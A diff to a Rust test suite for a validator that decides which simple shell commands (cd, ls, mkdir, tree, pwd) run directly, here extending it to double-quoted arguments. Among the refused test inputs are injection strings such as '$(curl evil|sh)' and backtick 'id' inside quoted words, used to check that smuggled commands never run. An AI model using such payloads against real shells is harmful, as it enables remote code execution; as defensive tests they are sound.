@@ -38,6 +38,10 @@ fn the_accept_table_runs() {
         "tree -L '2'",
         "cd áéíóúüñçàèò",
         "cd øåæłőžĀɏ",
+        "cd \"/home/u/curso rust\"",
+        "ls -la \"Mis Documentos\"",
+        "mkdir \"año 2026\"",
+        "tree -L \"2\"",
     ] {
         assert!(runs(text), "{text:?} must run");
     }
@@ -74,7 +78,20 @@ fn the_refuse_table_goes_to_the_prompt() {
         "ls *",
         "ls a?",
         "ls [a]",
-        "ls \"a\"",
+        "cd \"$HOME\"",
+        "cd \"`id`\"",
+        "cd \"a\\\"b\"",
+        "cd \"!x\"",
+        "cd \"a\"b",
+        "cd a\"b\"",
+        "cd \"~/x\"",
+        "cd \"-x\"",
+        "cd \"\"",
+        "cd \"unterminated",
+        "cd \"a'b\"",
+        "cd \"a\tb\"",
+        "\"ls\"",
+        "ls \"a\" \"b",
         "ls a`b`",
         "ls a&",
         "ls a!",
@@ -192,7 +209,10 @@ fn the_fallback_names_the_token_and_the_reason() {
     assert_eq!(why("FOO=1 ls"), "environment assignment");
     assert_eq!(why("cd ~root"), "~user is not supported");
     assert_eq!(why("ls a\tb"), "control character");
-    assert_eq!(why("ls \"a\""), "double quote");
+    assert_eq!(why("ls a\"b\""), "double quote");
+    assert_eq!(why("cd \"a\"b"), "text after a quote");
+    assert_eq!(why("cd \"$HOME\""), "shell metacharacter");
+    assert_eq!(why("\"ls\" a"), "the command is quoted");
     assert_eq!(why("ls a b c d e f g h i"), "too many words");
     assert_eq!(why(""), "empty command");
     assert_eq!(why("mkdir"), "missing argument");
@@ -208,6 +228,19 @@ fn targets_per_verb() {
     assert_eq!(targets("cd"), [("~", Existing)]);
     assert_eq!(targets("cd ~/x"), [("~/x", Existing)]);
     assert_eq!(targets("cd 'a b'"), [("a b", Existing)]);
+    assert_eq!(targets("cd \"a b\""), [("a b", Existing)]);
+    assert_eq!(
+        targets("ls -la \"Mis Documentos\" src"),
+        [
+            (".", Existing),
+            ("Mis Documentos", Existing),
+            ("src", Existing)
+        ]
+    );
+    assert_eq!(
+        targets("mkdir \"año 2026\""),
+        [(".", Existing), ("año 2026", New)]
+    );
     assert_eq!(targets("pwd"), [(".", Existing)]);
     assert_eq!(targets("ls"), [(".", Existing)]);
     assert_eq!(
@@ -225,7 +258,7 @@ fn targets_per_verb() {
 // Spec: checked bytes == written bytes; the API borrows, it never owns.
 #[test]
 fn as_str_borrows_the_input() {
-    let text = String::from("ls -la 'a b'");
+    let text = String::from("ls -la \"a b\"");
     let cmd = parse(&text).unwrap();
     assert_eq!(cmd.as_str().as_ptr(), text.as_ptr());
     assert_eq!(cmd.as_str(), text);
@@ -253,8 +286,8 @@ fn accepted_text_is_a_fixed_point_of_validate() {
         "cd", "ls", "tree", "pwd", "mkdir", " ", " ", " ", "-", "-la", "-p", "-L", "2", "~", "/",
         "a", "b", "dir", ".", "..", "'", "'x y'", "música", "ñ", "日本", ";", "|", "$", "*", "\n",
         "\t", "\u{202e}", "\u{200b}", "\u{00a0}", "\u{0301}", "\u{3164}", "\u{115f}", "=", "+",
-        "%", "^", "\"", "`", "\\", "'a", "!", "#", "~/x", "a~", "\r", "\0", "'", "?", "[", "&",
-        "(", "-L 2", "--", "a=~", "a:~", "\u{5b0}", "\u{2460}", "א",
+        "%", "^", "\"", "`", "\\", "'a", "\"x y\"", "\"a", "!", "#", "~/x", "a~", "\r", "\0", "'",
+        "?", "[", "&", "(", "-L 2", "--", "a=~", "a:~", "\u{5b0}", "\u{2460}", "א",
     ];
     let mut rng = Lcg(7);
     let mut accepted = 0;
@@ -282,6 +315,7 @@ fn no_single_character_slips_past_validate() {
         for text in [
             format!("ls a{c}b"),
             format!("ls 'a{c}b'"),
+            format!("ls \"a{c}b\""),
             format!("ls {c}"),
         ] {
             if parse(&text).is_ok() {
@@ -303,6 +337,7 @@ fn every_ascii_byte_is_classified_like_the_spec() {
         // could expand or end a quote, `$(` or a heredoc with.
         let quoted = word || c == '~' || c == ' ';
         assert_eq!(runs(&format!("ls 'a{c}'")), quoted, "quoted {c:?}");
+        assert_eq!(runs(&format!("ls \"a{c}\"")), quoted, "dquoted {c:?}");
     }
 }
 
@@ -313,6 +348,7 @@ fn non_ascii_is_limited_to_latin_letters() {
     for c in ['\u{c0}', 'ñ', 'ø', 'ł', '\u{100}', '\u{24f}', 'ß', 'ÿ'] {
         assert!(runs(&format!("cd a{c}b")), "{c:?} must run");
         assert!(runs(&format!("cd 'a {c}'")), "{c:?} must run quoted");
+        assert!(runs(&format!("cd \"a {c}\"")), "{c:?} must run dquoted");
     }
     for c in [
         '\u{5b0}',
@@ -341,6 +377,10 @@ fn non_ascii_is_limited_to_latin_letters() {
         assert!(
             !runs(&format!("cd 'a {c}'")),
             "{c:?} must go to the prompt quoted"
+        );
+        assert!(
+            !runs(&format!("cd \"a {c}\"")),
+            "{c:?} must go to the prompt dquoted"
         );
     }
     assert!(!runs("ls 日本語"));
@@ -374,6 +414,13 @@ fn a_tilde_only_leads_a_word() {
 fn a_quoted_word_holds_no_byte_a_shell_could_act_on() {
     for text in [
         "ls 'x\"$(curl evil|sh)\"'",
+        "ls \"x'$(curl evil|sh)'\"",
+        "ls \"x$(curl evil|sh)\"",
+        "ls \"x`curl evil|sh`\"",
+        "ls \"a;b\"",
+        "ls \"a|b\"",
+        "ls \"a\\\"b\"",
+        "ls \"a\"\"b\"",
         "ls 'a;b'",
         "ls 'a$b'",
         "ls 'a`b'",
@@ -397,6 +444,9 @@ fn a_quoted_word_holds_no_byte_a_shell_could_act_on() {
         "mkdir 'a b+c'",
         "cd 'música nueva'",
         "ls 'a.b_c@d%e:f,g=h~i-j/k'",
+        "ls \"my dir\"",
+        "mkdir \"a b+c\"",
+        "ls \"a.b_c@d%e:f,g=h~i-j/k\" \"x y\"",
     ] {
         assert!(runs(text), "{text:?}");
     }
@@ -429,7 +479,12 @@ fn shell_dangerous_bytes_never_run_in_any_position() {
             format!("ls 'a{c}'"),
             format!("cd 'x {c}y'"),
             format!("mkdir '{c}'"),
-        ]) {
+            format!("ls \"a{c}\""),
+            format!("cd \"x {c}y\""),
+            format!("mkdir \"{c}\""),
+        ])
+        .chain((c != "\"").then(|| format!("ls \"a{c}")))
+        {
             assert!(!runs(&text), "{text:?} must go to the prompt");
         }
     }
@@ -461,6 +516,10 @@ fn real_shells_split_accepted_commands_like_the_grammar() {
         "cd ~/dev/curso-ñandú",
         "ls a.b_c@d%e+f:g,h=i",
         "ls ~ ~/x",
+        "cd \"/home/u/curso rust\"",
+        "ls -la \"Mis Documentos\"",
+        "mkdir \"año 2026\"",
+        "ls \"a b\" 'c d' e",
     ];
     let mut shells = vec!["bash"];
     if Command::new("zsh").arg("-c").arg(":").output().is_ok() {
